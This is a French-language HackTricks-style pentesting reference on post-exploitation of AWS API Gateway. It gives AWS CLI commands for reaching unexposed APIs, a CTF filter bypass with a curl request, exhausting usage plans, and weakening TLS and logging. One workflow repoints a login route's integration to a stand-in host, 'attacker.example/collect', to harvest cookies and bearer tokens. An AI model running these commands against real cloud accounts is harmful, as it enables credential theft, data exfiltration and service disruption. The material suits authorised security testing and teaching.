# AWS - API Gateway Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## API Gateway

Pour plus d'informations, consultez :

{{#ref}}
../../aws-services/aws-api-gateway-enum.md
{{#endref}}

### Accéder aux APIs non exposées

Vous pouvez créer un endpoint sur [https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:) avec le service `com.amazonaws.us-east-1.execute-api`, exposer l'endpoint dans un réseau auquel vous avez accès (potentiellement via une machine EC2) et assigner un security group autorisant toutes les connexions.\
Ensuite, depuis la machine EC2 vous pourrez accéder à l'endpoint et donc appeler l'API Gateway qui n'était pas exposée auparavant.

### Bypass Request body passthrough

Cette technique a été trouvée dans [**this CTF writeup**](https://blog-tyage-net.translate.goog/post/2023/2023-09-03-midnightsun/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=en&_x_tr_pto=wapp).

Comme indiqué dans la [**AWS documentation**](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-apigateway-method-integration.html) dans la section `PassthroughBehavior`, par défaut la valeur **`WHEN_NO_MATCH`**, lors de la vérification de l'en-tête **Content-Type** de la requête, transmet la requête au back end sans transformation.

Ainsi, dans le CTF l'API Gateway avait un integration template qui **empêchait le flag d'être exfiltré** dans une réponse lorsqu'une requête était envoyée avec `Content-Type: application/json`:
```yaml
RequestTemplates:
application/json: '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename=:moviename","FilterExpression": "not contains(#description, :flagstring)","ExpressionAttributeNames": {"#description": "description"},"ExpressionAttributeValues":{":moviename":{"S":"$util.escapeJavaScript($input.params(''moviename''))"},":flagstring":{"S":"midnight"}}}'
```
Cependant, l'envoi d'une requête avec **`Content-type: text/json`** permettait de contourner ce filtre.

Enfin, comme l'API Gateway n'autorisait que `Get` et `Options`, il était possible d'envoyer une requête dynamoDB arbitraire sans aucune limite en envoyant une requête `POST` avec la requête dans le corps et en utilisant l'en-tête `X-HTTP-Method-Override: GET`:
```bash
curl https://vu5bqggmfc.execute-api.eu-north-1.amazonaws.com/prod/movies/hackers -H 'X-HTTP-Method-Override: GET' -H 'Content-Type: text/json'  --data '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename = :moviename","ExpressionAttributeValues":{":moviename":{"S":"hackers"}}}'
```
### Usage Plans DoS

Dans la section **Enumeration** vous pouvez voir comment **obtenir l'usage plan** des clés. Si vous avez la key et qu'elle est **limitée** à X utilisations **par mois**, vous pourriez **simplement l'utiliser et provoquer un DoS**.

L'**API Key** doit simplement être **inclusе** dans un **HTTP header** appelé **`x-api-key`**.

### Swap Route Integration To Exfil Traffic (HTTP APIs / `apigatewayv2`)

Si vous pouvez mettre à jour une **HTTP API integration**, vous pouvez **repoint** une route sensible (p.ex. `/login`, `/token`, `/submit`) vers un endpoint HTTP contrôlé par l'attaquant et **collecter silencieusement les headers et les bodies** (cookies, `Authorization` bearer tokens, session ids, API keys, secrets envoyés par des jobs internes, etc.).

Exemple de workflow:
```bash
REGION="us-east-1"
API_ID="<http_api_id>"

# Find routes and the integration attached to the interesting route
aws apigatewayv2 get-routes --region "$REGION" --api-id "$API_ID"
ROUTE_ID="<route_id>"
INTEGRATION_ID="$(aws apigatewayv2 get-route --region "$REGION" --api-id "$API_ID" --route-id "$ROUTE_ID" --query 'Target' --output text | awk -F'/' '{print $2}')"

# Repoint the integration to your collector (HTTP_PROXY / URL integration)
COLLECTOR_URL="https://attacker.example/collect"
aws apigatewayv2 update-integration --region "$REGION" --api-id "$API_ID" --integration-id "$INTEGRATION_ID" --integration-uri "$COLLECTOR_URL"
```
Notes :

- Pour les **HTTP APIs**, les modifications prennent généralement effet immédiatement (contrairement aux **REST APIs**, où vous devez en général créer un déploiement).
- La possibilité de pointer vers une URL arbitraire dépend de l'integration type/config ; dans certains cas, vous pouvez aussi changer l'integration type lors du patching.

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

Un attaquant disposant des permissions `apigateway:UpdateGatewayResponse` et `apigateway:CreateDeployment` peut **modifier une Gateway Response existante pour inclure des en-têtes personnalisés ou des modèles de réponse qui leak des informations sensibles ou exécutent des scripts malveillants**.
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Impact potentiel** : fuite d'informations sensibles, exécution de scripts malveillants ou accès non autorisé aux ressources d'API.

> [!NOTE]
> Nécessite des tests

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

Un attaquant disposant des permissions `apigateway:UpdateStage` et `apigateway:CreateDeployment` peut **modifier un stage existant d'API Gateway pour rediriger le trafic vers un autre stage ou modifier les paramètres de cache afin d'obtenir un accès non autorisé aux données mises en cache**.
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Impact potentiel**: Accès non autorisé aux données mises en cache, perturbation ou interception du trafic API.

> [!NOTE]
> Nécessite des tests

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

Un attaquant disposant des permissions `apigateway:PutMethodResponse` et `apigateway:CreateDeployment` peut **modifier la réponse de méthode d'une méthode existante d'API Gateway REST API pour inclure des en-têtes personnalisés ou des modèles de réponse qui leak des informations sensibles ou exécutent des scripts malveillants**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Impact potentiel**: Divulgation d'informations sensibles, exécution de scripts malveillants ou accès non autorisé aux ressources API.

> [!NOTE]
> Nécessite des tests

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

Un attaquant disposant des permissions `apigateway:UpdateRestApi` et `apigateway:CreateDeployment` peut **modifier les paramètres REST d'API Gateway pour désactiver la journalisation ou changer la version minimale de TLS, affaiblissant potentiellement la sécurité de l'API**.
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Impact potentiel** : Affaiblissement de la sécurité de l'API, pouvant permettre un accès non autorisé ou l'exposition d'informations sensibles.

> [!NOTE]
> Nécessite des tests

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

Un attaquant disposant des permissions `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, et `apigateway:CreateUsagePlanKey` peut **créer de nouvelles API keys, les associer à des usage plans, puis utiliser ces clés pour un accès non autorisé aux APIs**.
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**Impact potentiel** : Accès non autorisé aux ressources de l'API, contournement des contrôles de sécurité.

> [!NOTE]
> À tester

{{#include ../../../../banners/hacktricks-training.md}}
